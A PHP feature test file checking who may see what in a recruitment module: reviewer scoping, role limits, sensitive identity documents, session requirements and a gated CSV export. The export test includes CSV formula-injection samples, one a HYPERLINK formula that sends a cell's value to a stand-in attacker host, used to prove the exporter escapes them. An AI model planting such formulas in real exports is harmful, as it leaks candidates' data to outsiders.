<?php

namespace Tests\Feature;

use App\Filament\Resources\JobApplicationResource;
use App\Filament\Resources\NotarizationRequestResource;
use App\Filament\Resources\PaymentResource;
use App\Filament\Resources\PayoutResource;
use App\Filament\Resources\UserResource;
use App\Filament\Resources\VacancyResource;
use App\Models\ApplicationDocument;
use App\Models\JobApplication;
use App\Services\Recruitment\CandidateAccessService;
use App\Support\CsvSafe;
use App\Support\RecruitmentPermission;
use App\Support\Settings;
use Filament\Facades\Filament;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Tests\Support\Fixtures;
use Tests\Support\RecruitmentFixtures;
use Tests\TestCase;

/**
 * Who may see what, asked of the server rather than of the page.
 *
 * The brief is blunt about this and so are these tests: an administrator
 * seeing a control is never a substitute for server-side authorization. So
 * nothing here asserts that a button is hidden. Every assertion asks the thing
 * that actually decides — the ability map, the query scope, the document's own
 * readableBy() — and the HTTP tests type the URL that a hidden button would
 * have pointed at.
 *
 * Four separations matter, and each has its own test:
 *
 *   - A plain reviewer sees the applications they were given and no others.
 *   - A recruitment role is not an administrator. It reaches no payment, no
 *     payout, no user record and no client's notarized document.
 *   - A client or notary with no recruitment role holds nothing at all, which
 *     is every account on the platform.
 *   - Identity and guarantor paperwork needs sensitive.view on top of review
 *     access, so the coordinator running the pipeline cannot open a passport.
 */
class RecruitmentAuthorizationTest extends TestCase
{
    use RefreshDatabase;
    use Fixtures;
    use RecruitmentFixtures;

    protected function setUp(): void
    {
        parent::setUp();

        config(['recruitment.enabled' => true]);
        Settings::flush();
        Mail::fake();
    }

    protected function tearDown(): void
    {
        Settings::flush();

        parent::tearDown();
    }

    public function test_a_plain_reviewer_sees_only_the_applications_they_were_given(): void
    {
        $reviewer = $this->makeRecruiter(RecruitmentPermission::REVIEWER);

        $mine     = $this->makePublishedVacancy(['slug' => 'mine']);
        $somebody = $this->makePublishedVacancy(['slug' => 'somebody-elses']);

        $mine->reviewers()->attach($reviewer->id);

        $ours   = $this->makeApplication($mine);
        $theirs = $this->makeApplication($somebody);

        $visible = JobApplication::query()->visibleTo($reviewer)->pluck('id')->all();

        $this->assertSame([$ours->id], $visible);
        $this->assertFalse(RecruitmentPermission::canReview($reviewer, $theirs));
        $this->assertTrue(RecruitmentPermission::canReview($reviewer, $ours));

        // The admin screen applies the same rule in getEloquentQuery(), so a
        // row a reviewer may not see does not exist there either — not for
        // sorting, not for counting, not for the navigation badge.
        Auth::login($reviewer);

        $this->assertSame(
            [$ours->id],
            JobApplicationResource::getEloquentQuery()->pluck('job_applications.id')->all(),
        );

        Auth::logout();

        // A coordinator holds review_all, so the pipeline is theirs.
        $coordinator = $this->makeRecruiter(RecruitmentPermission::COORDINATOR);

        $this->assertCount(2, JobApplication::query()->visibleTo($coordinator)->get());

        // And somebody with no recruitment role sees nothing, rather than
        // seeing everything because no reviewer was ever assigned to them.
        $this->assertCount(0, JobApplication::query()->visibleTo($this->makeClient())->get());
        $this->assertCount(0, JobApplication::query()->visibleTo(null)->get());
    }

    public function test_a_recruitment_role_is_not_an_administrator(): void
    {
        $lead  = $this->makeRecruiter(RecruitmentPermission::LEAD);
        $panel = Filament::getPanel('admin');

        // They do get into the panel. That is the point of the module: the
        // door is shared and the rooms are not.
        $this->assertTrue($lead->canAccessPanel($panel));

        Auth::login($lead);

        $this->assertTrue(JobApplicationResource::canAccess());
        $this->assertTrue(VacancyResource::canAccess());

        // Nothing about money, nobody's account, and no client's document.
        $this->assertFalse(PaymentResource::canAccess());
        $this->assertFalse(PayoutResource::canAccess());
        $this->assertFalse(UserResource::canAccess());
        $this->assertFalse(NotarizationRequestResource::canAccess());

        Auth::logout();

        // The same resources answer differently for an administrator, which is
        // what proves the assertions above are about the role and not about a
        // resource that is simply switched off.
        Auth::login($this->makeRecruitmentAdmin());

        $this->assertTrue(PaymentResource::canAccess());
        $this->assertTrue(NotarizationRequestResource::canAccess());
        $this->assertTrue(JobApplicationResource::canAccess());
    }

    public function test_an_ordinary_account_holds_no_recruitment_ability_at_all(): void
    {
        $abilities = [
            RecruitmentPermission::MANAGE_VACANCIES,
            RecruitmentPermission::REVIEW,
            RecruitmentPermission::REVIEW_ALL,
            RecruitmentPermission::MOVE_STAGE,
            RecruitmentPermission::SCHEDULE_INTERVIEW,
            RecruitmentPermission::APPROVE_OFFER,
            RecruitmentPermission::VIEW_SENSITIVE,
            RecruitmentPermission::EXPORT,
            RecruitmentPermission::MANAGE_RETENTION,
        ];

        $client = $this->makeClient();
        $notary = $this->makeNotary()->user;

        foreach ([$client, $notary, null] as $actor) {
            foreach ($abilities as $ability) {
                $this->assertFalse(
                    RecruitmentPermission::allows($actor, $ability),
                    ($actor?->email ?? 'a visitor') . ' must not hold ' . $ability,
                );
            }

            $this->assertFalse(RecruitmentPermission::allowsAny($actor));
        }

        // A reviewer is the narrowest role there is: one ability, and the
        // eight that would let them run the process are not it.
        $reviewer = $this->makeRecruiter(RecruitmentPermission::REVIEWER);

        $this->assertTrue(RecruitmentPermission::allows($reviewer, RecruitmentPermission::REVIEW));

        foreach (array_diff($abilities, [RecruitmentPermission::REVIEW]) as $ability) {
            $this->assertFalse(RecruitmentPermission::allows($reviewer, $ability), 'reviewer holds ' . $ability);
        }

        // And a coordinator, who runs the pipeline, still cannot approve an
        // offer, open a passport, export the table or publish a vacancy.
        $coordinator = $this->makeRecruiter(RecruitmentPermission::COORDINATOR);

        $this->assertTrue(RecruitmentPermission::allows($coordinator, RecruitmentPermission::MOVE_STAGE));
        $this->assertFalse(RecruitmentPermission::allows($coordinator, RecruitmentPermission::APPROVE_OFFER));
        $this->assertFalse(RecruitmentPermission::allows($coordinator, RecruitmentPermission::VIEW_SENSITIVE));
        $this->assertFalse(RecruitmentPermission::allows($coordinator, RecruitmentPermission::EXPORT));
        $this->assertFalse(RecruitmentPermission::allows($coordinator, RecruitmentPermission::MANAGE_VACANCIES));
    }

    public function test_the_feature_switch_closes_the_module_for_everybody(): void
    {
        $lead  = $this->makeRecruiter(RecruitmentPermission::LEAD);
        $admin = $this->makeRecruitmentAdmin();

        config(['recruitment.enabled' => false]);
        Settings::flush();

        $this->assertFalse(RecruitmentPermission::moduleEnabled());
        $this->assertFalse(RecruitmentPermission::allows($lead, RecruitmentPermission::REVIEW));

        // The administrator too. A rollback switch that every admin walks
        // straight through is not a rollback switch, and the whole point of
        // this one is that it can be thrown without deleting anything.
        $this->assertFalse(RecruitmentPermission::allows($admin, RecruitmentPermission::REVIEW));
        $this->assertFalse(RecruitmentPermission::allowsAny($admin));

        Auth::login($admin);

        $this->assertFalse(JobApplicationResource::canAccess());
    }

    /** A stored file, with bytes, on the private disk. */
    private function file(JobApplication $application, string $kind): ApplicationDocument
    {
        $path = 'recruitment/' . $application->id . '/' . $kind . '-' . uniqid() . '.pdf';

        Storage::disk('private')->put($path, '%PDF-1.4 fictional');

        return ApplicationDocument::create([
            'job_application_id' => $application->id,
            'candidate_id'       => $application->candidate_id,
            'kind'               => $kind,
            'disk'               => 'private',
            'path'               => $path,
            'original_name'      => $kind . '.pdf',
            'mime'               => 'application/pdf',
            'size'               => 18,
        ]);
    }

    public function test_identity_paperwork_needs_more_than_review_access(): void
    {
        Storage::fake('private');

        $vacancy     = $this->makePublishedVacancy(['slug' => 'papers']);
        $application = $this->makeApplication($vacancy);

        $cv       = $this->file($application, ApplicationDocument::KIND_CV);
        $passport = $this->file($application, ApplicationDocument::KIND_IDENTITY);

        // The kind decides this, not the caller. Nothing passed is_sensitive
        // above: the CV takes the column default and the identity row is
        // marked sensitive on the way in regardless. Read back from the
        // database, because that is where the rule ran.
        $this->assertFalse($cv->fresh()->is_sensitive);
        $this->assertTrue($passport->fresh()->is_sensitive);

        $reviewer    = $this->makeRecruiter(RecruitmentPermission::REVIEWER);
        $coordinator = $this->makeRecruiter(RecruitmentPermission::COORDINATOR);
        $hr          = $this->makeRecruiter(RecruitmentPermission::HR_ADMIN);

        $vacancy->reviewers()->attach($reviewer->id);

        // The assigned reviewer reads the CV they are marking against.
        $this->actingAs($reviewer)
            ->get(route('admin.recruitment.document', $cv))
            ->assertOk()
            ->assertHeader('x-content-type-options', 'nosniff')
            ->assertDownload('cv.pdf');

        // The same reviewer, same application, the passport: refused.
        $this->actingAs($reviewer)
            ->get(route('admin.recruitment.document', $passport))
            ->assertForbidden();

        // The coordinator runs the pipeline and sees every application, and is
        // refused the same file. Breadth of access is not depth of access.
        $this->assertTrue(RecruitmentPermission::canReview($coordinator, $application));

        $this->actingAs($coordinator)
            ->get(route('admin.recruitment.document', $passport))
            ->assertForbidden();

        // The HR administrator, who holds sensitive.view, reads it.
        $this->actingAs($hr)
            ->get(route('admin.recruitment.document', $passport))
            ->assertOk()
            ->assertDownload('identity.pdf');

        // A reviewer with no claim on this vacancy gets nothing, CV included:
        // the id in the URL is not the authority.
        $stranger = $this->makeRecruiter(RecruitmentPermission::REVIEWER);

        $this->actingAs($stranger)->get(route('admin.recruitment.document', $cv))->assertForbidden();

        // And a client, who is signed in to the platform but is not staff.
        $this->actingAs($this->makeClient())
            ->get(route('admin.recruitment.document', $cv))
            ->assertForbidden();
    }

    public function test_nothing_a_candidate_uploads_is_reachable_without_a_session(): void
    {
        Storage::fake('private');

        $application = $this->makeApplication($this->makePublishedVacancy(['slug' => 'no-session']));
        $cv          = $this->file($application, ApplicationDocument::KIND_CV);

        // Signed out: the route is behind the staff guard, so this is a
        // redirect to the login page and not a file.
        $this->get(route('admin.recruitment.document', $cv))->assertRedirect(route('login'));

        // The file itself has no public URL to guess. It is on the private
        // disk, which is storage/app/private, and nothing symlinks it into the
        // web root — so there is no second door to this that a session guards.
        $this->assertFalse(Storage::disk('public')->exists($cv->path));
        $this->assertTrue(Storage::disk('private')->exists($cv->path));

        // A candidate session is not a staff session. The guard that let them
        // in cannot answer a question about the users table, and asking it
        // properly returns nobody rather than somebody.
        [$plain] = app(CandidateAccessService::class)->issue($application->candidate);

        $this->post(route('candidate.login.redeem', $plain));
        $this->assertAuthenticated('candidate');

        $this->assertNull(RecruitmentPermission::current());
        $this->assertFalse(RecruitmentPermission::check(RecruitmentPermission::REVIEW));

        $this->get(route('admin.recruitment.document', $cv))->assertRedirect(route('login'));
    }

    public function test_an_export_is_gated_and_its_cells_are_not_code(): void
    {
        // The ability first. A coordinator running the pipeline cannot take
        // the table away with them; the HR administrator and the lead can.
        $this->assertFalse(RecruitmentPermission::allows(
            $this->makeRecruiter(RecruitmentPermission::COORDINATOR),
            RecruitmentPermission::EXPORT,
        ));

        $this->assertTrue(RecruitmentPermission::allows(
            $this->makeRecruiter(RecruitmentPermission::HR_ADMIN),
            RecruitmentPermission::EXPORT,
        ));

        // Then the cells. A candidate types what they like into a motivation
        // statement, and a spreadsheet reads a leading =, +, - or @ as code.
        $csv = CsvSafe::build(['Name', 'Motivation'], [
            ['Ada Nwosu', '=HYPERLINK("http://evil.test/"&A1,"Click")'],
            ['Bode Ajayi', '+1-800-NOT-A-SUM'],
            ['Chidi Eze', '-2+3'],
            ['Dupe Ola', '@SUM(A1:A9)'],
            ['Efe Imoh', "A tab\there and a\nnewline there."],
            ['Funke Ade', 'Nothing special about this one.'],
        ]);

        foreach ([
            '=HYPERLINK',
            '+1-800-NOT-A-SUM',
            '-2+3',
            '@SUM(A1:A9)',
        ] as $formula) {
            $this->assertStringContainsString("'" . $formula, $csv, $formula . ' was left executable');
        }

        // The text is still all there — escaping it must not mangle it.
        $this->assertStringContainsString('Ada Nwosu', $csv);
        $this->assertStringContainsString('Nothing special about this one.', $csv);

        // A harmless cell is not given a stray apostrophe.
        $this->assertStringNotContainsString("'Nothing special", $csv);

        // And a newline inside a cell does not become a row of its own.
        $this->assertSame(7, count(array_filter(explode("\n", trim($csv)))));

        // Excel on Windows needs the BOM or every non-ASCII name arrives
        // mangled, which is its own kind of getting a candidate's name wrong.
        $this->assertStringStartsWith("\xEF\xBB\xBF", $csv);
    }
}
